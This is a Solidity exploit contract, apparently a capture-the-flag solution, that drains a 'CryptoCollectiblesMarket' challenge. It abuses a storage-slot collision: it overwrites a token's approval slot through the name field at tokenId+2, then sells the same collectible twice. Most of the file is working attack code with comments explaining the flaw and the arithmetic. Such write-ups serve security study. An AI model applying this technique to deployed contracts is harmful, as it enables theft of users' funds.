// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract MarketAttacker {

    Setup setup;
    CryptoCollectiblesMarket market;
    CryptoCollectibles token;

    constructor(address _setupAddress) {
        setup = Setup(_setupAddress);
        market = CryptoCollectiblesMarket(setup.market());
        token = CryptoCollectibles(setup.token());
    }

    // The token uses tokenId as storage slot for data access, and does not check token validity, which is something we can hack.

    // The storage order is `name owner approval metadata`. We can update the metadata field to our address, then after selling the
    // token, we can update `tokenId + 2` and set its name to ourself, resulting in the original token to be approved to us.

    // If the token's mint value is `x`, the actual value is `10/11 * x`. We want to double-sell the token and drain the market,
    // so (20/11 - 1)x = marketEth -> x = marketEth * 11/9. The market has 50 Eth in the beginning, we can send it 40 Eth and set
    // `x` to 110 to solve the challenge.

    function attack() public payable {
        // Send the market 40 Eth.
        market.mintCollectibleFor{value: 40 ether}(address(this));

        // Mint a token for 110 Eth.
        bytes32 tokenId = market.mintCollectibleFor{value: 110 ether}(address(this));

        // Update its metadata so we can reclaim ownership later.
        token.eternalStorage().updateMetadata(tokenId, address(this));

        // Sell token.
        token.approve(tokenId, address(market));
        market.sellCollectible(tokenId);

        // Update the `approve` slot of original tokenId.
        token.eternalStorage().updateName(bytes32(uint256(tokenId) + 2), bytes32(uint256(address(this))));

        // For debugging.
        // {
        //     (bytes32 name, address tokenOwner, address approved, address metadata) = token.getTokenInfo(tokenId);
        //     console.logBytes32(name);
        //     console.log(tokenOwner, approved, metadata);
        // }

        // Transfer ownership to ourself and sell again.
        token.transferFrom(tokenId, address(market), address(this));
        token.approve(tokenId, address(market));
        market.sellCollectible(tokenId);
    }

    receive() payable external {}

}
